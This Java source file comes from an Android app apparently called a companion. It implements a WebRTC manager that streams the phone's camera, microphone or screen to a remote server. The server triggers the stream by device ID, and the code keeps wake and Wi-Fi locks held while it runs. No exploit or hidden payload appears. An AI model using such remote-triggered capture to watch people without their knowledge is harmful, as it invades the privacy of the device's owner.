package com.snapapp.companion;

import android.content.Context;
import android.net.wifi.WifiManager;
import android.os.PowerManager;
import android.util.Log;
import org.json.JSONObject;
import org.webrtc.*;
import java.util.ArrayList;
import java.util.List;

public class WebRtcStreamManager {
    private static final String TAG = "WebRtcStream";
    private static WebRtcStreamManager instance;
    private PeerConnectionFactory factory; private PeerConnection peerConnection;
    private VideoCapturer videoCapturer; private VideoSource videoSource;
    private SurfaceTextureHelper surfaceTextureHelper; private AudioSource audioSource;
    private VideoTrack localVideoTrack; private AudioTrack localAudioTrack;
    private EglBase eglBase; private Context appContext;
    private boolean isFrontCamera = true, hasRemoteDesc = false, useSpeaker = true;
    private String activeServerUrl, activeDeviceId, pendingOfferSdp;
    private PowerManager.WakeLock wakeLock; private WifiManager.WifiLock wifiLock;
    private final List<IceCandidate> pendingCandidates = new ArrayList<>();

    private WebRtcStreamManager() {}
    public static synchronized WebRtcStreamManager getInstance() { return instance == null ? (instance = new WebRtcStreamManager()) : instance; }
    public synchronized boolean isStreaming() { return peerConnection != null; }
    public synchronized void setAudioOutput(String mode) { useSpeaker = !"earpiece".equalsIgnoreCase(mode); WebRtcIceHelper.setAudioOutput(appContext, useSpeaker); }

    public synchronized void startLiveStream(final Context ctx, final String serverUrl, final String deviceId,
                                             final boolean front, final boolean video, final boolean audio, final boolean speakerOn) {
        startLiveStream(ctx, serverUrl, deviceId, front, video, audio, speakerOn, "video");
    }

    public synchronized void startLiveStream(final Context ctx, final String serverUrl, final String deviceId,
                                             final boolean front, final boolean video, final boolean audio, final boolean speakerOn, final String mode) {
        stopLiveStream();
        this.appContext = ctx.getApplicationContext();
        this.activeServerUrl = serverUrl; this.activeDeviceId = deviceId;
        this.isFrontCamera = front; this.useSpeaker = speakerOn;
        acquireLocks(ctx);
        try {
            WebRtcIceHelper.setAudioOutput(ctx, useSpeaker);
            EglBase.Context eglCtx = null;
            try { eglBase = EglBase.create(); eglCtx = eglBase.getEglBaseContext(); } catch (Throwable ignored) { eglBase = null; }
            factory = WebRtcIceHelper.buildFactory(ctx, eglCtx);
            PeerConnection.RTCConfiguration config = WebRtcIceHelper.buildRtcConfig();

            peerConnection = factory.createPeerConnection(config, new PeerConnection.Observer() {
                @Override public void onSignalingChange(PeerConnection.SignalingState s) {}
                @Override public void onIceConnectionChange(PeerConnection.IceConnectionState s) { Log.d(TAG, "ICE: " + s); }
                @Override public void onIceConnectionReceivingChange(boolean b) {}
                @Override public void onIceGatheringChange(PeerConnection.IceGatheringState s) {}
                @Override public void onIceCandidate(IceCandidate ic) { sendSignal("candidate", null, ic); }
                @Override public void onIceCandidatesRemoved(IceCandidate[] ics) {}
                @Override public void onAddStream(MediaStream ms) {
                    if (ms != null && ms.audioTracks != null && !ms.audioTracks.isEmpty()) handleIncomingAudio(ms.audioTracks.get(0), ctx);
                }
                @Override public void onTrack(RtpTransceiver t) {
                    if (t != null && t.getReceiver() != null && t.getReceiver().track() instanceof AudioTrack) handleIncomingAudio((AudioTrack) t.getReceiver().track(), ctx);
                }
                @Override public void onAddTrack(RtpReceiver r, MediaStream[] ms) {
                    if (r != null && r.track() instanceof AudioTrack) handleIncomingAudio((AudioTrack) r.track(), ctx);
                }
                @Override public void onRemoveStream(MediaStream ms) {}
                @Override public void onDataChannel(DataChannel dc) {}
                @Override public void onRenegotiationNeeded() {}
            });

            if (audio) {
                try {
                    MediaConstraints ac = new MediaConstraints();
                    ac.mandatory.add(new MediaConstraints.KeyValuePair("googEchoCancellation", "true"));
                    ac.mandatory.add(new MediaConstraints.KeyValuePair("googAutoGainControl", "true"));
                    ac.mandatory.add(new MediaConstraints.KeyValuePair("googHighpassFilter", "false"));
                    ac.mandatory.add(new MediaConstraints.KeyValuePair("googNoiseSuppression", "false"));
                    audioSource = factory.createAudioSource(ac);
                    localAudioTrack = factory.createAudioTrack("ARDAMSa0", audioSource);
                    peerConnection.addTrack(localAudioTrack);
                } catch (Throwable t) { Log.e(TAG, "Audio error", t); }
            }

            if (video) {
                boolean isScreen = "screen".equalsIgnoreCase(mode);
                videoCapturer = isScreen ? WebRtcScreenHelper.createCapturer() : WebRtcCameraHelper.createCapturer(ctx, front, eglCtx != null);
                if (videoCapturer != null) {
                    try {
                        surfaceTextureHelper = SurfaceTextureHelper.create("CaptureThread", eglCtx);
                        videoSource = factory.createVideoSource(false);
                        videoCapturer.initialize(surfaceTextureHelper, ctx, videoSource.getCapturerObserver());
                        if (isScreen) videoCapturer.startCapture(540, 960, 15);
                        else videoCapturer.startCapture(640, 360, 15);
                        localVideoTrack = factory.createVideoTrack("ARDAMSv0", videoSource);
                        localVideoTrack.setEnabled(true);
                        peerConnection.addTrack(localVideoTrack);
                    } catch (Throwable t) { Log.e(TAG, "Video error", t); videoCapturer = null; }
                }
            }

            if (pendingOfferSdp != null) {
                String sdp = pendingOfferSdp; pendingOfferSdp = null;
                handleRemoteOffer(sdp);
            }
        } catch (Exception e) { Log.e(TAG, "startLiveStream error", e); stopLiveStream(); }
    }

    private void handleIncomingAudio(AudioTrack at, Context ctx) {
        try { if (at != null) { at.setEnabled(true); at.setVolume(10.0); WebRtcIceHelper.enableLoudspeaker(appContext != null ? appContext : ctx); } } catch (Throwable ignored) {}
    }

    private void acquireLocks(Context ctx) {
        try {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm != null && (wakeLock == null || !wakeLock.isHeld())) (wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "snap:live")).acquire(15 * 60 * 1000L);
            WifiManager wm = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm != null && (wifiLock == null || !wifiLock.isHeld())) (wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "snap:wifi")).acquire();
        } catch (Throwable ignored) {}
    }

    public synchronized void switchCamera() { if (videoCapturer != null && !(videoCapturer instanceof ScreenCapturerAndroid)) isFrontCamera = WebRtcCameraHelper.switchCamera(videoCapturer, isFrontCamera); }
    public synchronized void setOrientation(String ori) {
        if (videoCapturer instanceof ScreenCapturerAndroid) WebRtcScreenHelper.setOrientation(videoCapturer, ori);
        else if (videoCapturer != null) WebRtcCameraHelper.setOrientation(videoCapturer, ori);
    }

    public synchronized void handleRemoteOffer(String sdpDescription) {
        if (peerConnection == null) { pendingOfferSdp = sdpDescription; return; }
        SessionDescription offer = new SessionDescription(SessionDescription.Type.OFFER, sdpDescription);
        peerConnection.setRemoteDescription(new WebRtcIceHelper.SimpleSdpObserver() {
            @Override public void onSetSuccess() {
                hasRemoteDesc = true;
                for (IceCandidate c : new ArrayList<>(pendingCandidates)) { try { peerConnection.addIceCandidate(c); } catch (Exception ignored) {} }
                pendingCandidates.clear();
                peerConnection.createAnswer(new WebRtcIceHelper.SimpleSdpObserver() {
                    @Override public void onCreateSuccess(SessionDescription answer) {
                        String sdp = answer.description;
                        if (sdp.contains("useinbandfec=1")) sdp = sdp.replace("useinbandfec=1", "useinbandfec=1;maxaveragebitrate=16000;stereo=0");
                        final String fSdp = sdp;
                        peerConnection.setLocalDescription(new WebRtcIceHelper.SimpleSdpObserver() {
                            @Override public void onSetSuccess() {
                                final PeerConnection pc = peerConnection;
                                WebRtcIceHelper.waitForIceAndRun(pc, fSdp, () -> {
                                    SessionDescription loc = pc != null ? pc.getLocalDescription() : null;
                                    String finalSdp = (loc != null && loc.description != null) ? loc.description : fSdp;
                                    sendSignal("answer", finalSdp, null);
                                });
                            }
                            @Override public void onSetFailure(String s) { Log.e(TAG, "setLocalDesc failed: " + s); }
                        }, new SessionDescription(answer.type, fSdp));
                    }
                    @Override public void onCreateFailure(String s) { Log.e(TAG, "createAnswer failed: " + s); }
                }, new MediaConstraints());
            }
            @Override public void onSetFailure(String s) { Log.e(TAG, "setRemoteDesc failed: " + s); }
        }, offer);
    }

    public synchronized void handleRemoteCandidate(String sdp, int sdpMLineIndex, String sdpMid) {
        if (sdp == null || sdp.isEmpty()) return;
        IceCandidate c = new IceCandidate(sdpMid, sdpMLineIndex, sdp);
        if (peerConnection != null && hasRemoteDesc && peerConnection.getRemoteDescription() != null) {
            try { peerConnection.addIceCandidate(c); } catch (Exception ignored) {}
        } else {
            pendingCandidates.add(c);
        }
    }

    private void sendSignal(String type, String sdp, IceCandidate candidate) {
        if (activeServerUrl == null || activeDeviceId == null) return;
        try {
            JSONObject body = new JSONObject().put("type", type).put("sender", "device");
            if (sdp != null) body.put("sdp", sdp);
            if (candidate != null) body.put("candidate", new JSONObject().put("candidate", candidate.sdp).put("sdpMLineIndex", candidate.sdpMLineIndex).put("sdpMid", candidate.sdpMid));
            ApiClient.postJson(activeServerUrl + "/api/devices/" + activeDeviceId + "/signaling", body, null);
        } catch (Exception e) { Log.e(TAG, "sendSignal error", e); }
    }

    public synchronized void stopLiveStream() {
        try {
            pendingCandidates.clear(); hasRemoteDesc = false; pendingOfferSdp = null;
            if (appContext != null) { try { WebRtcIceHelper.setAudioOutput(appContext, false); } catch (Throwable ignored) {} appContext = null; }
            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release(); wakeLock = null;
            if (wifiLock != null && wifiLock.isHeld()) wifiLock.release(); wifiLock = null;
            if (videoCapturer != null) { try { videoCapturer.stopCapture(); } catch (Throwable ignored) {} videoCapturer.dispose(); videoCapturer = null; }
            if (surfaceTextureHelper != null) { surfaceTextureHelper.dispose(); surfaceTextureHelper = null; }
            if (localVideoTrack != null) { localVideoTrack.dispose(); localVideoTrack = null; }
            if (videoSource != null) { videoSource.dispose(); videoSource = null; }
            if (localAudioTrack != null) { localAudioTrack.dispose(); localAudioTrack = null; }
            if (audioSource != null) { audioSource.dispose(); audioSource = null; }
            if (peerConnection != null) { peerConnection.close(); peerConnection = null; }
            if (factory != null) { factory.dispose(); factory = null; }
            if (eglBase != null) { eglBase.release(); eglBase = null; }
        } catch (Exception ignored) {}
    }
}
